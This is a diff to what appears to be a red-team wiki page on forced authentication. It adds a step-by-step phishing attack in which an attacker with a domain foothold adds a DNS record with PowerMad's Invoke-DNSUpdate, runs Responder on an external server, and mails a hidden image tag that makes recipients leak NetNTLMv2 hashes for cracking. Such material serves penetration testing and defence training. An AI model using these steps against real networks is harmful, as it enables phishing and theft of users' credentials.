@@ -2,7 +2,7 @@
 description: 'Credential Access, Stealing hashes'
 ---
 
-# T1187: Forced Authentication
+# Forced Authentication
 
 ## Execution via Hyperlink
 
@@ -147,6 +147,22 @@ Launching the document gives away victim's hashes immediately:
 ![](../../.gitbook/assets/peek-2018-12-09-17-04.gif)
 
 {% file src="../../.gitbook/assets/smb-image.xml" caption="smb-image.xml" %}
+
+## Execution via HTTP Image and Internal DNS
+
+If we have a foothold in a network, we can do the following:
+
+* Create a new DNS A record \(any authenticated user can do it\) inside the domain, say `offense.local`, you have a foothold in, and point it to your external server, say `1.1.1.1`
+  * Use [PowerMad](https://github.com/Kevin-Robertson/Powermad) to do this with: `Invoke-DNSUpdate -dnsname vpn -dnsdata 1.1.1.1`
+* On your controlled server 1.1.1.1, start `Responder` and listen for HTTP connections on port 80
+* Create a phishing email, that contains `<img src="http://vpn.offense.local"/>` 
+  * Feel free to make the image 1x1 px or hidden
+  * Note that `http://vpn.offense.local` resolves to `1.1.1.1` \(where your Responder is listening on port 80\), but only from inside the `offense.local` domain
+* Send the phish to target users from the `offense.local` domain
+* Phish recipients view the email, which automatically attemps to load the image from `http://vpn.offense.local`, which resolves to `http://1.1.1.1` \(where Responder is litening on port 80\)
+* Responder catches NetNLTMv2 hashes for the targeted users with no user interaction required
+* Start cracking the hashes
+* Hopefully profit
 
 ## References
 
